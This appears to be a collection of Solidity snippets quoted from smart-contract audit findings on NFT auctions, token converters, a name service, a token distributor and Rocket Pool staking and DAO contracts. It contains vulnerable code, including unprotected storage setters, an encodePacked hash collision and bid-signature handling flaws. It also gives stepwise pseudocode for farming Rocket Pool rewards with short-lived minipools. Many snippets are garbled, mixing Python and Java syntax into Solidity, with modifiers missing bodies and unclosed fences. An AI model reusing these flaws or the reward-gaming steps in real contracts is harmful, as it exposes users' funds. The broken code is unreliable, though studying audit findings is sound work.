tokenid\n) external {\n    address recoveredBidder = recover(\n        toEthSignedMessageHash(keccak256(abi.encode(rand, address(this), block.chainid, bid, nftAddress, tokenid))),\n        signature\n    );\n    require(bidder == recoveredBidder, 'zAuction: incorrect bidder');\n    require(!randUsed[rand], 'Random nonce already used');\n    randUsed[rand] = true;\n    IERC721 nftContract = IERC721(nftAddress);\n    accountant.Exchange(bidder, msg.sender, bid);\n    nftContract.transferFrom(msg.sender, bidder, tokenid);\n    emit BidAccepted(bidder, msg.sender, bid, nftAddress, tokenid);\n}\n```"
```\nIERC20 weth = IERC20(address(0xc778417E063141139Fce010982780140Aa0cD5Ab)); // rinkeby weth\n```
"```\nfunction Withdraw(uint256 amount) external {\n    ethbalance[msg.sender] = SafeMath.sub(ethbalance[msg.sender], amount);\n    payable(msg.sender).transfer(amount);\n    emit Withdrew(msg.sender, amount);\n}\n```\n```\nfunction Deposit() external payable {\n    ethbalance[msg.sender] = SafeMath.add(ethbalance[msg.sender], msg.value);\n    emit Deposited(msg.sender, msg.value);\n}\n```\n```\nfunction zDeposit(address to) external payable onlyZauction {\n    ethbalance[to] = SafeMath.add(ethbalance[to], msg.value);\n    emit zDeposited(to, msg.value);\n}\n\nfunction zWithdraw(address from, uint256 amount) external onlyZauction {\n    ethbalance[from] = SafeMath.sub(ethbalance[from], amount);\n    emit zWithdrew(from, amount);\n}\n\nfunction Exchange(address from, address to, uint256 amount) external onlyZauction {\n    ethbalance[from] = SafeMath.sub(ethbalance[from], amount);\n    ethbalance[to] = SafeMath.add(ethbalance[to], amount);\n    emit zExchanged(from, to, amount);\n}\n```"
"```\nfunction acceptBid(bytes memory signature, uint256 rand, address bidder, uint256 bid, address nftaddress, uint256 tokenid) external {\n    address recoveredbidder = recover(toEthSignedMessageHash(keccak256(abi.encode(rand, address(this), block.chainid, bid, nftaddress, tokenid))), signature);\n    require(bidder == recoveredbidder, 'zAuction: incorrect bidder');\n    require(!randUsed[rand], 'Random nonce already used');\n    randUsed[rand] = true;\n    IERC721 nftcontract = IERC721(nftaddress);\n    accountant.Exchange(bidder, msg.sender, bid);\n    nftcontract.transferFrom(msg.sender, bidder, tokenid);\n    emit BidAccepted(bidder, msg.sender, bid, nftaddress, tokenid);\n}\n\nfunction acceptWethBid(bytes memory signature, uint256 rand, address bidder, uint256 bid, address nftaddress, uint256 tokenid) external {\n    address recoveredbidder = recover(toEthSignedMessageHash(keccak256(abi.encode(rand, address(this), block.chainid, bid, nftaddress, tokenid, true))), signature);\n    require(bidder == recoveredbidder, 'zAuction: incorrect bidder');\n    require(!randUsed[rand], 'Random nonce already used');\n    randUsed[rand] = true;\n    IERC721 nftcontract = IERC721(nftaddress);\n    weth.transferFrom(bidder, msg.sender, bid);\n    nftcontract.transferFrom(msg.sender, bidder, tokenid);\n    emit WethBidAccepted(bidder, msg.sender, bid, nftaddress, tokenid);\n}\n```"
"```\nfunction reduceWeight(IERC20Token _reserveToken)\n    public\n    validReserve(_reserveToken)\n    ownerOnly\n{\n    _protected();\n}\n```\n```\ncontract ReentrancyGuard {\n    bool private locked = false;\n\n    // ensures instantiation only by sub-contracts\n    constructor() internal {}\n\n    // protects a function against reentrancy attacks\n    modifier protected() {\n        _protected();\n        locked = true;\n       _;\n        locked = false;\n    }\n\n    // error message binary size optimization\n    function _protected() internal view {\n        require(!locked, ""ERR_REENTRANCY"");\n    }\n}"
```\nfunction setMinimumWeight(uint32 _minimumWeight)\n    public\n    ownerOnly\n    inactive\n{\n    minimumWeight = _minimumWeight;\n    emit MinimumWeightUpdated(_minimumWeight);\n}\n```\n```\nfunction setStepWeight(uint32 _stepWeight)\n    public\n    ownerOnly\n    inactive\n{\n    stepWeight = _stepWeight;\n    emit StepWeightUpdated(_stepWeight);\n}\n```
"```\nfunction converterType() public pure returns (uint16) {\n    return 3;\n}\n```\n```\n{\n    DSToken token = new DSToken(_name, _symbol, _decimals);\n\n    token.issue(msg.sender, _initialSupply);\n\n    emit NewToken(token);\n\n    createConverter(\n        token,\n        _reserveToken,\n        _reserveWeight,\n        _reserveBalance,\n        _registry,\n        _maxConversionFee,\n        _minimumWeight,\n        _stepWeight,\n        _marketCapThreshold\n    );\n\n    return token;\n}\n```\n```\nfunction upgradeOld(DynamicLiquidTokenConverter _converter, bytes32 _version) public {\n    DynamicLiquidTokenConverter converter = DynamicLiquidTokenConverter(_converter);\n    address prevOwner = converter.owner();\n    acceptConverterOwnership(converter);\n    DynamicLiquidTokenConverter newConverter = createConverter(converter);\n\n    copyReserves(converter, newConverter);\n    copyConversionFee(converter, newConverter);\n    transferReserveBalances(converter, newConverter);\n    IConverterAnchor anchor = converter.token();\n\n    bool activate = isV28OrHigherConverter(converter) && converter.isActive();\n\n    if (anchor.owner() == address(converter)) {\n        converter.transferTokenOwnership(address(newConverter));\n        newConverter.acceptAnchorOwnership();\n    }\n\n    handleTypeSpecificData(converter, newConverter, activate);\n    converter.transferOwnership(prevOwner);\n    newConverter.transferOwnership(prevOwner);\n\n    emit ConverterUpgrade(address(converter), address(newConverter));\n}\n```\n```\nfunction upgradeOld(\n    IConverter _converter,\n    bytes32 _version\n) public {\n    upgrade(_converter, 0);\n}\n```"
"```\n/**\n * @dev returns true if the converter is active, false otherwise\n * @return true if the converter is active, false otherwise\n */\nfunction isActive() public view virtual override returns (bool) {\n    return anchor.owner() == address(this);\n}\n```\n```\n/**\n * @dev returns true if the converter is active, false otherwise\n * @return true if the converter is active, false otherwise\n*/\nfunction isActive() public view override returns (bool) {\n    return super.isActive() && address(priceOracle)!= address(0);\n}\n```\n```\nfunction activate(\n    IERC20Token _primaryReserveToken,\n    IChainlinkPriceOracle _primaryReserveOracle,\n    IChainlinkPriceOracle _secondaryReserveOracle)\n    public\n    ownerOnly\n    validReserve(_primaryReserveToken)\n    notThis(address(_primaryReserveOracle))\n    notThis(address(_secondaryReserveOracle))\n    validAddress(address(_primaryReserveOracle))\n    validAddress(address(_secondaryReserveOracle))\n{\n```\n```\nmodifier public ifActiveOnlyUpgrader() {\n    if (isActive()) {\n        require(owner == addressOf(CONVERTER_UPGRADER), ""ERR_ACTIVE_NOT_UPGRADER"");\n    }\n}\n```\n```\nuint32 public minimumWeight = 30000;\nuint32 public stepWeight = 10000;\nuint256 public marketCapThreshold = 10000 ether;\nuint256 public lastWeightAdjustmentMarketCap = 0;\n```\n```\nfunction setMarketCapThreshold(uint256 _marketCapThreshold)\n    public\n    ownerOnly\n    ifActiveOnlyUpgrader\n{\n    marketCapThreshold = _marketCapThreshold;\n    emit MarketCapThresholdUpdated(_marketCapThreshold);\n}\n```"
"```\nfunction registerAddress(bytes32 _contractName, address _contractAddress)\n    public\n    ownerOnly\n    validAddress(_contractAddress)\n{\n```\n```\nfunction addressOf(bytes32 _contractName) public view override returns (address) {\n    if (items[_contractName].contractAddress!= address(0)) {\n        return items[_contractName].contractAddress;\n    } else {\n        return contractRegistry.addressOf(_contractName);\n    }\n}\n```\n```\n/**\n * returns the number of items in the registry\n * @return number of items\n*/\nfunction itemCount() public view returns (uint256) {\n    return contractNames.length;\n}\n```"
```\nfunction getMarketCap(IERC20Token _reserveToken)\n    public\n    view\n    returns(uint256)\n{\n    Reserve storage reserve = reserves[_reserveToken];\n    return reserveBalance(_reserveToken).mul(1e6).div(reserve.weight);\n}\n```
```\nfunction converterType() public pure override returns (uint16) {\n    return 3;\n}\n```\n```\nfunction converterType() public pure override returns (uint16) {\n    return 1;\n}\n```\n```\nfunction converterType() public pure override returns (uint16) {\n    return 2;\n}\n```
"```\ncontract ZeroDAOToken is\n    OwnableUpgradeable,\n    ERC20Upgradeable,\n    ERC20PausableUpgradeable,\n    ERC20SnapshotUpgradeable\n{\n```\n```\n_updateAccountSnapshot(sender)\n```"
"```\nfunction release(address beneficiary) public {\n    uint256 unreleased = getReleasableAmount(beneficiary);\n    require(unreleased > 0, ""Nothing to release"");\n\n    TokenAward storage award = getTokenAwardStorage(beneficiary);\n    award.released += unreleased;\n\n    targetToken.safeTransfer(beneficiary, unreleased);\n\n    emit Released(beneficiary, unreleased);\n}\n\nfunction revoke(address beneficiary) public onlyOwner {\n    TokenAward storage award = getTokenAwardStorage(beneficiary);\n\n    require(award.revocable, ""Cannot be revoked"");\n    require(!award.revoked, ""Already revoked"");\n\n    uint256 unreleased = getReleasableAmount(beneficiary);\n    award.released += unreleased;\n\n    uint256 refund = award.amount - award.released;\n\n    award.revoked = true;\n    award.amount = award.released;\n\n    targetToken.safeTransfer(beneficiary, unreleased);\n    targetToken.safeTransfer(owner(), refund);\n\n    emit Released(beneficiary, unreleased);\n    emit Revoked(beneficiary, refund);\n}"
"```\nfunction revoke(address beneficiary) public onlyOwner {\n    TokenAward storage award = getTokenAwardStorage(beneficiary);\n\n    require(award.revocable, ""Cannot be revoked"");\n    require(!award.revoked, ""Already revoked"");\n\n    uint256 unreleased = getReleasableAmount(beneficiary);\n    award.released += unreleased;\n\n    uint256 refund = award.amount - award.released;\n\n    award.revoked = true;\n    award.amount = award.released;\n\n    targetToken.safeTransfer(beneficiary, unreleased);\n    targetToken.safeTransfer(owner(), refund);\n\n    emit Released(beneficiary, unreleased);\n    emit Revoked(beneficiary, refund);\n}"
"```\nfunction approveDomainBid(\n    uint256 parentId,\n    string memory bidIPFSHash,\n    bytes memory signature\n) external authorizedOwner(parentId) {\n    bytes32 hashOfSig = keccak256(abi.encode(signature));\n    approvedBids[hashOfSig] = true;\n    emit DomainBidApproved(bidIPFSHash);\n}\n```"
"```\nfunction acceptBid(\n    bytes memory signature,\n    uint256 rand,\n    address bidder,\n    uint256 bid,\n    address nftAddress,\n    uint256 tokenid\n) external {\n    address recoveredBidder = recover(\n        toEthSignedMessageHash(keccak256(abi.encode(rand, address(this), block.chainid, bid, nftAddress, tokenid))),\n        signature\n    );\n    require(bidder == recoveredBidder, 'zAuction: incorrect bidder');\n    require(!randUsed[rand], 'Random nonce already used');\n    randUsed[rand] = true;\n    IERC721 nftContract = IERC721(nftAddress);\n    accountant.Exchange(bidder, msg.sender, bid);\n    nftContract.transferFrom(msg.sender, bidder, tokenid);\n    emit BidAccepted(bidder, msg.sender, bid, nftAddress, tokenid);\n}\n```\n```\nfunction fulfillDomainBid(\n  uint256 parentId,\n  uint256 bidAmount,\n  uint256 royaltyAmount,\n  string memory bidIPFSHash,\n  string memory name,\n  string memory metadata,\n  bytes memory signature,\n  bool lockOnCreation,\n  address recipient\n) external {\n    bytes32 recoveredBidHash = createBid(parentId, bidAmount, bidIPFSHash, name);\n    address recoveredBidder = recover(recoveredBidHash, signature);\n    require(recipient == recoveredBidder, ""ZNS: bid info doesn't match/exist"");\n    bytes32 hashOfSig = keccak256(abi.encode(signature));\n    require(approvedBids[hashOfSig] == true, ""ZNS: has been fulfilled"");\n    infinity.safeTransferFrom(recoveredBidder, controller, bidAmount);\n    uint256 id = registrar.registerDomain(parentId, name, controller, recoveredBidder);\n    registrar.setDomainMetadataUri(id, metadata);\n    registrar.setDomainRoyaltyAmount(id, royaltyAmount);\n    registrar.transferFrom(controller, recoveredBidder, id);\n    if (lockOnCreation) {\n        registrar.lockDomainMetadataForOwner(id);\n    }\n    approvedBids[hashOfSig] = false;\n    emit DomainBidFulfilled(\n        metadata,\n        name,\n        recoveredBidder,\n        id,\n        parentId\n    );\n}\n```"
"```\nfunction createBid(\n    uint256 parentId,\n    uint256 bidAmount,\n    string memory bidIPFSHash,\n    string memory name\n) public pure returns (bytes32) {\n    return keccak256(abi.encode(parentId, bidAmount, bidIPFSHash, name));\n}\n```"
"```\nfunction registerDomain(\n    uint256 parentId,\n    string memory name,\n    address domainOwner,\n    address minter\n) external override onlyController returns (uint256) {\n    uint256 labelHash = uint256(keccak256(bytes(name)));\n    address controller = msg.sender;\n\n    // Domain parents must exist\n    require(_exists(parentId), ""Zer0 Registrar: No parent"");\n\n    // Calculate the new domain's id and create it\n    uint256 domainId = uint256(keccak256(abi.encodePacked(parentId, labelHash)));\n    _createDomain(domainId, domainOwner, minter, controller);\n\n    emit DomainCreated(domainId, name, labelHash, parentId, minter, controller);\n\n    return domainId;\n}"
"```\nfunction fulfillDomainBid(\n  uint256 parentId,\n  uint256 bidAmount,\n  uint256 royaltyAmount,\n  string memory bidIPFSHash,\n  string memory name,\n  string memory metadata,\n  bytes memory signature,\n  bool lockOnCreation,\n  address recipient\n) external {\n    bytes32 recoveredBidHash = createBid(parentId, bidAmount, bidIPFSHash, name);\n    address recoveredBidder = recover(recoveredBidHash, signature);\n    require(recipient == recoveredBidder, ""ZNS: bid info doesn't match/exist"");\n    bytes32 hashOfSig = keccak256(abi.encode(signature));\n    require(approvedBids[hashOfSig] == true, ""ZNS: has been fulfilled"");\n    infinity.safeTransferFrom(recoveredBidder, controller, bidAmount);\n    uint256 id = registrar.registerDomain(parentId, name, controller, recoveredBidder);\n    registrar.setDomainMetadataUri(id, metadata);\n    registrar.setDomainRoyaltyAmount(id, royaltyAmount);\n    registrar.transferFrom(controller, recoveredBidder, id);\n    if (lockOnCreation) {\n        registrar.lockDomainMetadataForOwner(id);\n    }\n    approvedBids[hashOfSig] = false;\n    emit DomainBidFulfilled(\n        metadata,\n        name,\n        recoveredBidder,\n        id,\n        parentId\n    );\n}\n```\n```\nfunction acceptBid(\n    bytes memory signature,\n    uint256 rand,\n    address bidder,\n    uint256 bid,\n    address nftAddress,\n    uint256 tokenid\n) external {\n    address recoveredBidder = recover(\n        toEthSignedMessageHash(keccak256(abi.encode(rand, address(this), block.chainid, bid, nftAddress, tokenid))),\n        signature\n    );\n    require(bidder == recoveredBidder, 'zAuction: incorrect bidder');\n    require(!randUsed[rand], 'Random nonce already used');\n    randUsed[rand] = true;\n    IERC721 nftContract = IERC721(nftAddress);\n    accountant.Exchange(bidder, msg.sender, bid);\n    nftContract.transferFrom(msg.sender, bidder, tokenid);\n    emit BidAccepted(bidder, msg.sender, bid, nftAddress, tokenid);\n}\n```"
"```\nfunction fulfillDomainBid(\n    uint256 parentId,\n    uint256 bidAmount,\n    uint256 royaltyAmount,\n    string memory bidIPFSHash,\n    string memory name,\n    string memory metadata,\n    bytes memory signature,\n    bool lockOnCreation,\n    address recipient\n) external {\n    bytes32 recoveredBidHash = createBid(parentId, bidAmount, bidIPFSHash, name);\n    address recoveredBidder = recover(recoveredBidHash, signature);\n    require(recipient == recoveredBidder, ""ZNS: bid info doesn't match/exist"");\n    bytes32 hashOfSig = keccak256(abi.encode(signature));\n    require(approvedBids[hashOfSig] == true, ""ZNS: has been fulfilled"");\n    infinity.safeTransferFrom(recoveredBidder, controller, bidAmount);\n    uint256 id = registrar.registerDomain(parentId, name, controller, recoveredBidder);\n    registrar.setDomainMetadataUri(id, metadata);\n    registrar.setDomainRoyaltyAmount(id, royaltyAmount);\n    registrar.transferFrom(controller, recoveredBidder, id);\n    if (lockOnCreation) {\n        registrar.lockDomainMetadataForOwner(id);\n    }\n}\n```"
"```\nfunction fulfillDomainBid(\n  uint256 parentId,\n  uint256 bidAmount,\n  uint256 royaltyAmount,\n  string memory bidIPFSHash,\n  string memory name,\n  string memory metadata,\n  bytes memory signature,\n  bool lockOnCreation,\n  address recipient\n) external {\n    bytes32 recoveredBidHash = createBid(parentId, bidAmount, bidIPFSHash, name);\n    address recoveredBidder = recover(recoveredBidHash, signature);\n    require(recipient == recoveredBidder, ""ZNS: bid info doesn't match/exist"");\n    bytes32 hashOfSig = keccak256(abi.encode(signature));\n    require(approvedBids[hashOfSig] == true, ""ZNS: has been fulfilled"");\n    infinity.safeTransferFrom(recoveredBidder, controller, bidAmount);\n    uint256 id = registrar.registerDomain(parentId, name, controller, recoveredBidder);\n    registrar.setDomainMetadataUri(id, metadata);\n    registrar.setDomainRoyaltyAmount(id, royaltyAmount);\n    registrar.transferFrom(controller, recoveredBidder, id);\n    if (lockOnCreation) {\n        registrar.lockDomainMetadataForOwner(id);\n    }\n    approvedBids[hashOfSig] = false;\n    emit DomainBidFulfilled(\n        metadata,\n        name,\n        recoveredBidder,\n        id,\n        parentId\n    );\n}\n```\n```\nfunction acceptBid(\n    bytes memory signature,\n    uint256 rand,\n    address bidder,\n    uint256 bid,\n    address nftaddress,\n    uint256 tokenid\n) external {\n    address recoveredBidder = recover(\n        toEthSignedMessageHash(keccak256(abi.encode(rand, address(this), block.chainid, bid, nftaddress, tokenid))),\n        signature\n    );\n    require(bidder == recoveredBidder, 'zAuction: incorrect bidder');\n    require(!randUsed[rand], 'Random nonce already used');\n    randUsed[rand] = true;\n}\n```"
"```\nabstract contract ERC721PausableUpgradeable is Initializable, ERC721Upgradeable, PausableUpgradeable {\n    function __ERC721Pausable_init() internal initializer {\n        __Context_init_unchained();\n        __ERC165_init_unchained();\n        __Pausable_init_unchained();\n        __ERC721Pausable_init_unchained();\n    }\n```\n```\nfunction initialize() public initializer {\n    __Ownable_init();\n    __ERC721_init(""Zer0 Name Service"", ""ZNS"");\n\n    // create the root domain\n    _createDomain(0, msg.sender, msg.sender, address(0));\n}\n```"
"```\ncontract Registrar is\n    IRegistrar,\n    OwnableUpgradeable,\n    ERC721PausableUpgradeable {\n```"
```\nfunction addController(address controller) external override onlyOwner {\n    controllers[controller] = true;\n    emit ControllerAdded(controller);\n}\n\n/**\n * @notice Unauthorizes a controller to control the registrar\n * @param controller The address of the controller\n */\nfunction removeController(address controller) external override onlyOwner {\n    controllers[controller] = false;\n    emit ControllerRemoved(controller);\n}\n```
"```\n-- reward period ends -- front-run other claimers to maximize profits\n\n[create x minipools]\n\n[stake to max effective RPL for amount of minipools; locked for 14 days]\n\n[claim rewards for inflated effective RPL stake]\n\n[dissolve(), close() minipools -> refund NETH]\n\n[burn NETH for ETH]\n\n// rest of code\nwait 14 days\n\n[withdraw stake\n  OR\nstart again creating Minipools, claiming rewards\n  while the Minipools are dissolved right after, freeing the ETH]\n```\n```\n[stake max effective amount for the number of minipools]\n\n[claim() to claim the previous period even though we did not provide any stake for the duration]\n\n[optionally dissolve Minipools unlocking ETH]\n\n-- stake is locked for at least 14 days --\n-- 14 days forward - new reward period started --\n[claim() the period]\n\n[withdraw() (leaving min pool stake OR everything if we dissolve all the Minipools)]\n\n[lend RPL to other platforms and earn interest]\n-- 14 days forward - new reward period started --\n[get RPL back from another platform]\n[stake & create minipools to inflate effective stake]\n[claim()]\n\n[optionally dissolve Minipools to unlock node ETH]\n-- stake is locked for at least 14 days --\n-- 14 days forward - new reward period started --\n[claim() the period]\n[withdraw() (leaving min pool stake OR everything if we dissolve all the Minipools)]\n[lend RPL to other platforms and earn interest]\n```\n```\nrequire(block.number.sub(getNodeRPLStakedBlock(msg.sender)) >= \n    rocketDAOProtocolSettingsRewards.getRewardsClaimIntervalBlocks(), \n    ""The withdrawal cooldown period has not passed"");\nGet & check node's current RPL stake"
"```\nrequire(_hashLeaf(user_id, user_amount, leaf), 'TokenDistributor: Leaf Hash Mismatch.')\n```\n```\n/**\n * @notice hash user_id + claim amount together & compare results to leaf hash\n * @return boolean true on match\n*/\nfunction _hashLeaf(uint32 user_id, uint256 user_amount, bytes32 leaf) private returns (bool) {\n```\n```\nbytes32 leaf_hash = \n    keccak256(abi.encodePacked(\n        keccak256(abi.encodePacked(user_id, user_amount))\n    ));\n```\n```\nreturn leaf == leaf_hash;\n```\n```\nlibrary Encode {\n    function encode32Plus256(uint32 _a, uint256 _b) public pure returns (bytes memory) {\n        return abi.encodePacked(_a, _b);\n    }\n\n    function encode256Plus32(uint256 _a, uint32 _b) public pure returns (bytes memory) {\n        return abi.encodePacked(_a, _b);\n    }\n}\n\ncontract Hash {\n    function checkEqual() public pure returns (bytes32, bytes32) {\n        uint32 a1 = 0x12345678;\n        uint256 b1 = 0x99999999999999999999999999999999999999999999999999999999FFFFFFFF;\n\n        uint256 a2 = 0x1234567899999999999999999999999999999999999999999999999999999999;\n        uint32 b2 = 0xFFFFFFFF;\n\n        bytes memory packed1 = Encode.encode32Plus256(a1, b1);\n        bytes memory packed2 = Encode.encode256Plus32(a2, b2);\n\n        require(keccak256(packed1) == keccak256(packed2), ""Hash of representation should match"");\n\n        return (\n            keccak256(packed1),\n            keccak256(packed2)\n        );\n    }\n}"
"```\nrequire(hashMatch(user_id, user_address, user_amount, delegate_address, leaf, eth_signed_message_hash_hex), 'TokenDistributor: Hash Mismatch.')\n```\n```\nreturn getDigest(claim) == eth_signed_message_hash_hex;\n```\n```\ndef hashClaim(claim):\n    pass\n```"
"```\nfunction _hashLeaf(uint32 user_id, uint256 user_amount, bytes32 leaf) private returns (bool) {\n```\n```\nbytes32 leaf_hash = \n    keccak256(abi.encodePacked(\n        keccak256(abi.encodePacked(user_id, user_amount))\n    ));\n```\n```\nreturn leaf == leaf_hash;\n```"
"```\n_delegateTokens(user_address, delegate_address);\n```\n```\nfunction _delegateTokens(address delegator, address delegatee) private returns (bool) {\n    GTCErc20 GTCToken = GTCErc20(token);\n    GTCToken.delegateOnDist(delegator, delegatee);\n    return true;\n}\n```"
```\ngtc = gtc_\n```\n```\nvestingAmount = vestingAmount_;\nvestingBegin = vestingBegin_;\nvestingCliff = vestingCliff_;\nvestingEnd = vestingEnd_;\n```\n```\npublic class Gtc {\n    public Gtc;\n}\n```\n```\nuint public vestingAmount;\nuint public vestingBegin;\nuint public vestingCliff;\nuint public vestingEnd;\n```
"```\n/**\nRecovery\n*/\n\nfunction memberJoinRequired(string memory _id, string memory _email) override public onlyLowMemberMode onlyRegisteredNode(msg.sender) onlyLatestContract(""rocketDAONodeTrusted"", address(this)) {\n    (bool successPropose, bytes memory responsePropose) = getContractAddress('rocketDAONodeTrustedProposals').call(abi.encodeWithSignature(""proposalInvite(string,string,address)"", _id, _email, msg.sender));\n    require(successPropose, getRevertMsg(responsePropose));\n\n    (bool successJoin, bytes memory responseJoin) = getContractAddress(""rocketDAONodeTrustedActions"").call(abi.encodeWithSignature(""actionJoinRequired(address)"", msg.sender));\n    require(successJoin, getRevertMsg(responseJoin));\n}\n```\n```\nsetSettingBool(""node.registration.enabled"", true);"
"```\nsetSettingUint('members.challenge.cooldown', 6172)              # How long a member must wait before performing another challenge, approx. 1 day worth of blocks\nsetSettingUint('members.challenge.window', 43204)               # How long a member has to respond to a challenge. 7 days worth of blocks\nsetSettingUint('members.challenge.cost', 1 ether)               # How much it costs a non-member to challenge a member's node. It's free for current members to challenge other members.\n```\n```\nif the majority/all of members go offline permanently and no more proposals could be passed, a current member or a regular node can 'challenge' a DAO member's node to respond.\n\nif it does not respond in the given window, it can be removed as a member. the one who removes the member after the challenge isn't met, must be another node other than the proposer to provide some oversight.\n\nthis should only be used in an emergency situation to recover the DAO. members that need removing when consensus is still viable, should be done via the 'kick' method."
"```\nmodifier onlyDAOProtocolProposal() {\n    if (getBool(keccak256(abi.encodePacked(settingNameSpace, ""deployed"")))) {\n        require(getContractAddress('rocketDAOProtocolProposals') == msg.sender, ""Only DAO Protocol Proposals contract can update a setting"");\n    }\n}\n```\n```\nmodifier onlyDAONodeTrustedProposal() {\n    if (getBool(keccak256(abi.encodePacked(settingNameSpace, ""deployed"")))) {\n        require(getContractAddress('rocketDAONodeTrustedProposals') == msg.sender, ""Only DAO Node Trusted Proposals contract can update a setting"");\n    }\n}\n```"
"```\nmodifier onlyLatestRocketNetworkContract() {\n    if (boolStorage[keccak256(abi.encodePacked(""contract.storage.initialised""))] == true) {\n        require(boolStorage[keccak256(abi.encodePacked(""contract.exists"", msg.sender))], ""Invalid or outdated network contract"");\n    }\n}\n```"
"```\nrequire(_startBlock > block.number, ""Proposal start block must be in the future"");\nrequire(_durationBlocks > 0, ""Proposal cannot have a duration of 0 blocks"");\nrequire(_expiresBlocks > 0, ""Proposal cannot have an execution expiration of 0 blocks"");\nrequire(_votesRequired > 0, ""Proposal cannot have a 0 votes required to be successful"");\n```\n```\nsetSettingUint('proposal.vote.delay.blocks', 1);\n// How long before a proposal can be voted on after it is created. Approx. Next Block"
"```\nrocketMinipoolManager.setMinipoolWithdrawalBalances(_minipoolAddress, _stakingEndBalance, nodeAmount);\n\nif (_stakingEndBalance < userDepositBalance):\n    rocketNodeStaking = RocketNodeStakingInterface(getContractAddress(""rocketNodeStaking""))\n    rocketNodeStaking.slashRPL(minipool.getNodeAddress(), userDepositBalance - _stakingEndBalance)\n```\n```\nuint256 rplSlashAmount = calcBase.mul(_ethSlashAmount).div(rocketNetworkPrices.getRPLPrice());\n\nuint256 rplStake = getNodeRPLStake(_nodeAddress);\nif (rplSlashAmount > rplStake) {\n    rplSlashAmount = rplStake;\n}\n\nrocketVault.transferToken(""rocketAuctionManager"", getContractAddress(""rocketTokenRPL""), rplSlashAmount);\n\ndecreaseTotalRPLStake(rplSlashAmount);\ndecreaseNodeRPLStake(_nodeAddress, rplSlashAmount);\n```\n```\nreturn rocketDAOProtocolSettingsMinipool.getHalfDepositUserAmount()\n   .mul(rocketDAOProtocolSettingsNode.getMinimumPerMinipoolStake())\n   .mul(rocketMinipoolManager.getNodeMinipoolCount(_nodeAddress))\n   .div(rocketNetworkPrices.getRPLPrice());\n```"
```\nfunction getInflationIntervalsPassed() override public view returns(uint256) {\n    uint256 inflationLastCalculatedBlock = getInflationCalcBlock();\n    uint256 inflationInterval = getInflationIntervalBlocks();\n\n    if (inflationLastCalculatedBlock > 0) {\n        return (block.number).sub(inflationLastCalculatedBlock).div(inflationInterval);\n    } else {\n        return 0;\n    }\n}\n```\n```\nfunction inflationCalculate() public view returns (uint256) {\n    uint256 inflationTokenAmount = 0;\n    uint256 inflationRate = getInflationIntervalRate();\n    uint256 intervalsSinceLastMint = getInflationIntervalsPassed();\n\n    if (intervalsSinceLastMint > 0 && inflationRate > 0) {\n        uint256 rate = inflationRate;\n        for (uint256 i = 1; i < intervalsSinceLastMint; i++) {\n            rate = rate.mul(inflationRate).div(10 ** 18);\n        }\n        uint256 totalSupplyCurrent = totalSupply();\n        inflationTokenAmount = totalSupplyCurrent.mul(rate).div(10 ** 18).sub(totalSupplyCurrent);\n    }\n    return inflationTokenAmount;\n}\n```
"```\nsets contract.exists.0xfefe = true\nsets contract.name.0xfefe = ""test""\nsets contract.address.test = ""0xfefe""\nsets contract.abi.test = ""abi""\n```\n```\nsets contract.exists.0xbadbad = true\nsets contract.name.0xbadbad = ""badcontract""\nsets contract.address.badcontract = ""0xbadbad""\nsets contract.abi.badcontract = ""abi""\n```\n```\noverwrites contract.exists.0xbadbad = true  # (even though it's already true)\nupdates contract.name.0xbadbad = ""test""  # (overwrites the reference to badcontract; badcontracts config is now inconsistent)\nupdates contract.address.test = ""0xbadbad""  # (ok, expected)\nupdates contract.abi.test = ""abi""  # (ok, expected)\nremoves contract.name.0xfefe  # (ok)\nremoves contract.exists.0xfefe  # (ok)\n```\n```\nsets contract.exists.0xc0c0 = true\nsets contract.name.0xc0c0 = ""test""  # (ok, expected)\nupdates contract.address.test = 0xc0c0  # (ok, expected)\nupdates contract.abi.test = abi  # (ok, expected)\nremoves contract.name.0xbadbad\nremoves contract.exists.0xbadbad\n```\ncontract.exists = 0xbadbad\ncontract.name = ""badcontract""\nsets contract.address = ""0xbadbad""\nsets contract.abi = ""abi""\n```\n```\nrequire(_contractAddress!= address(0x0), ""Invalid contract address"")\n```\n```\nrequire(_contractAddress!= address(0x0), ""Invalid contract address"");\nrequire(_contractAddress!= oldContractAddress, ""The contract address cannot be set to its current address"");\n\nrequire(_contractAddress!= address(0x0), ""Invalid contract address"");\nrequire(_contractAddress!= oldContractAddress, ""The contract address cannot be set to its current address"");\n\nsetBool(keccak256(abi.encodePacked(""contract.exists"", _contractAddress)), true);\nsetString(keccak256(abi.encodePacked(""contract.name"", _contractAddress)), _name);\nsetAddress(keccak256(abi.encodePacked(""contract.address"", _name)), _contractAddress);\nsetString(keccak256(abi.encodePacked(""contract.abi"", _name)), _contractAbi);\n```"
"```\nmodifier onlyLatestRocketNetworkContract() {\n    if (boolStorage[keccak256(abi.encodePacked(""contract.storage.initialised""))] == true) {\n        require(boolStorage[keccak256(abi.encodePacked(""contract.exists"", msg.sender))], ""Invalid or outdated network contract"");\n    }\n}\n```\n```\nfunction setAddress(bytes32 _key, address _value) public override external {\n    addressStorage[_key] = _value;\n}\n\nfunction setUint(bytes32 _key, uint _value) public override external {\n    uintStorage[_key] = _value;\n}\n```"
"```\nrequire(_votesRequired > 0, ""Proposal cannot have a 0 votes required to be successful"")\n```\n```\nfunction propose(string memory _proposalMessage, bytes memory _payload) override public onlyTrustedNode(msg.sender) onlyLatestContract(""rocketDAONodeTrustedProposals"", address(this)) returns (uint256) {\n    RocketDAOProposalInterface daoProposal = RocketDAOProposalInterface(getContractAddress('rocketDAOProposal'));\n    RocketDAONodeTrustedInterface daoNodeTrusted = RocketDAONodeTrustedInterface(getContractAddress('rocketDAONodeTrusted'));\n    RocketDAONodeTrustedSettingsProposalsInterface rocketDAONodeTrustedSettingsProposals = \n        RocketDAONodeTrustedSettingsProposalsInterface(getContractAddress(""rocketDAONodeTrustedSettingsProposals""));\n\n    require(daoNodeTrusted.getMemberLastProposalBlock(msg.sender).add(rocketDAONodeTrustedSettingsProposals.getCooldown()) <= block.number, \n        ""Member has not waited long enough to make another proposal"");\n\n    setUint(keccak256(abi.encodePacked(daoNameSpace, ""member.proposal.lastblock"", msg.sender)), block.number);\n\n    return daoProposal.add(msg.sender, 'rocketDAONodeTrustedProposals', _proposalMessage, \n        block.number.add(rocketDAONodeTrustedSettingsProposals.getVoteDelayBlocks()), \n        rocketDAONodeTrustedSettingsProposals.getVoteBlocks(), \n        rocketDAONodeTrustedSettingsProposals.getExecuteBlocks(), \n        daoNodeTrusted.getMemberQuorumVotesRequired(), _payload);\n}"
